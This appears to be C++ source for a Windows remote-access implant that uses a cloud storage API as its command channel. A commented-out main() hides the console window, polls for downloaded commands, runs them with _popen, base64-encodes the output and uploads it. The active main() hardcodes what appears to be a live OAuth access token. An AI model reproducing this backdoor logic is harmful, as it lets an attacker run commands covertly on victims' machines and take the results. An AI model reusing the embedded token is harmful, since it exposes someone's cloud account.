#include <stdio.h>
#include <iostream>
#include <windows.h>
#include "MyString.h"
#include "CloudFunctions.h"
#include <stdio.h>

int Odd_Num() {
    int result = rand();
    if (result % 2 == 1)
        return result;
    else
        return result - 1;
}

//int main() {
//    //HWND h = GetConsoleWindow();
//    //ShowWindow(h, 0);
//    DWORD i = 2;
//    while (Odd_Num() % 2 != 0) {
//        Sleep(expo(i, 4) * 1000);
//        MyString data = downloadContext();
//        if (data.getLength() > 0) {
//            
//            i = 2;
//            for (int i = 0; i < data.getLength(); i++) {
//                if (data.getCharAt(i) == '\n') {
//                    data.setCharAt(i, '&');
//                }
//            }
//            FILE* file = _popen(data.getContext(), "r");
//            MyString output = "";
//            char temp_buffer[1024];
//            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
//                output = output + temp_buffer;
//            }
//            //output = encoder(output, 1);
//            output = converter_64(output);
//            upload(output);
//            deleteContext();
//        } else {
//            i++;
//        }
//    }
//    return 0;
//}

int main() {
    std::string output;
    std::string refreshToken;
    std::string accessToken = "ya29.a0AcM612y6rVSYtP90ijDLNW_xqvcfgqV8CwSa52j3_eQA8JgMsNmhRvxH1SmSTWw9GDWSeTUG7ZRYavRPCwM1k9qIU_aRcEHjGrnKDzBQj0fOfzTWSnBaQLCHLtkw4AgpoUF3SIlfWNvGgoaP4l_1LjLGIat5krxDKG4wpjfEWwaCgYKAeASARASFQHGX2Mie2onw65Tg46rV153wG053w0177";
    //for (int i = 0; i < 6.5 * 1024; i++)
    //{
    //    output += "a";
    //}
    WORD errorCode;
    //errorCode = singlePartUpload(output, accessToken, 151, 27);
    //errorCode = downloadSourceContext(accessToken, output);
    //DWORD responseCode;
    /*setNewAccessToken(accessToken, refreshToken);*/
    //responseCode = setNewRefreshAndAccessToken(accessToken, refreshToken);
    //handleFailsafe(refreshToken, accessToken);
    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), responseCode);
    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\n", refreshToken.c_str(), accessToken.c_str());
    //downloadContext(accessToken, output);
    //printf("Test begins:\nThe single upload error code: %d", errorCode);
    //printf_s("Source Context is: %s", output.c_str());


    return 0;
}

void main1() {
    FILE* file = _popen("dir&dir&dir&dir&dir&dir&dir&dir&dir", "r");
    char buffer[1024];
    while (fgets(buffer, 1024, file))
    {
        printf("%s", buffer);
    }

}